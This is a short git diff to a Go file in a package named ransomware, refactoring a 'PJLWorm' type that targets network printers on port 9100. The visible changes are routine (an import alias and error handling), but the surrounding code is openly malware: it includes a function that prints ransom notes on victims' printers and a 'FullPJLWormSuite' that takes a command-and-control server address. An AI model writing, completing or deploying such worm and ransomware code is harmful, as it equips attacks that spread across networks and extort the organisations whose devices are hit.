@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"fmt"
 	"net"
@@ -9,13 +11,13 @@ import (
 )
 
 type PJLWorm struct {
-	config      *RansomwareConfig
+	config      *rw.RansomwareConfig
 	printerIPs  []string
 	port        int
 	pjlPayload  string
 }
 
-func NewPJLWorm(cfg *RansomwareConfig) *PJLWorm {
+func NewPJLWorm(cfg *rw.RansomwareConfig) *PJLWorm {
 	return &PJLWorm{
 		config: cfg,
 		port:   9100,
@@ -182,7 +184,8 @@ func (p *PJLWorm) PrintRansomNote(printerIP string, note string) error {
 		"\x0C" +
 		"\x1B%-12345X"
 
-	return p.SendPJLCommand(printerIP, pclJob)
+	_, err := p.SendPJLCommand(printerIP, pclJob)
+	return err
 }
 
 func (p *PJLWorm) FullPJLWormSuite(c2Server string) map[string]interface{} {
